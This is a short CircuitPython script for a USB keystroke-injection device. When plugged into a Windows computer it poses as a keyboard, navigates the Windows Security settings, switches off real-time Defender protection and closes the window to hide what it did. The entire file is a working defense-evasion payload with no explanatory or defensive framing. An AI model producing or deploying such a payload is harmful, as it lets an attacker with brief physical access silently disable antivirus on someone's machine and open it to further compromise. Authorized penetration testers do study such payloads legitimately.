import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS

# Initialize the keyboard
keyboard = Keyboard(usb_hid.devices)
keyboard_layout = KeyboardLayoutUS(keyboard)

# Disables Windows Defender
# Open Defender settings
keyboard.send(Keycode.CONTROL, Keycode.ESCAPE)
time.sleep(1.0)
keyboard_layout.write("defender")
time.sleep(1.0)
keyboard.send(Keycode.ENTER)
time.sleep(5.0)
keyboard.send(Keycode.ENTER)
time.sleep(1.0)
keyboard.send(Keycode.TAB)
time.sleep(1.0)
keyboard.send(Keycode.TAB)
time.sleep(1.0)
keyboard.send(Keycode.TAB)
time.sleep(1.0)
keyboard.send(Keycode.TAB)
time.sleep(1.0)
keyboard.send(Keycode.ENTER)
time.sleep(1.0)
# Disable protection
time.sleep(1.0)
keyboard.send(Keycode.SPACEBAR)
time.sleep(1.0)
keyboard.send(Keycode.LEFT_ARROW)
time.sleep(1.0)
keyboard.send(Keycode.ENTER)
time.sleep(1.0)
# Clean up
time.sleep(1.0)
keyboard.send(Keycode.ALT, Keycode.F4)